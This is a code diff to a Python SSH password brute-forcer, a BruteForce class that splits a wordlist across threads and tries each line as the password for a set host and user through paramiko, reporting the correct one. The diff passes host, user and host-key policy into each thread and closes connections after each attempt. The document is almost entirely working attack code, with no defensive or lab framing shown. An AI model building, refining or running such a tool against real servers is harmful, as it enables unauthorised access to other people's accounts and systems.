@@ -18,30 +18,35 @@ class BruteForce:
         self.remain_lines = self.filelines - self.one_lines*self.thread_num
         self.thread_list = []
         self.numberlines = 1
+        policy_t = paramiko.AutoAddPolicy()
         for i in range(self.thread_num):
             if i == self.thread_num-1:
                 lines = self.one_lines + self.remain_lines
             else:
                 lines = self.one_lines
-            thread = Thread(target=self.bruteforce, args=(self.numberlines,self.numberlines+lines,self.q),daemon=True)
+            host_t = self.host
+            user_t = self.user
+            thread = Thread(target=self.bruteforce, args=(self.numberlines,self.numberlines+lines,host_t,user_t,policy_t,self.q),daemon=True)
             self.numberlines += lines
             self.thread_list.append(thread)
             thread.start()
         return self.thread_list
 
-    def bruteforce(self,numberlines,lines,q):
+    def bruteforce(self,numberlines,lines,host_t,user_t,policy_t,q):
         for i in range(numberlines,lines):
             line = linecache.getline(self.filename, i)
             line = line.strip()
             try:
                 client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(self.host, username=self.user, password=line)
+                client.set_missing_host_key_policy(policy_t)
+                client.connect(host_t, username=user_t, password=line)
                 q.put(line)   
                 print(f'[+] {line} is correct')
                 break
             except:
                 print(f'[-] {line} is not correct')
+            finally:
+                client.close()
 
     def get_filelines(self,filename):
         lens = len(linecache.getlines(self.filename))
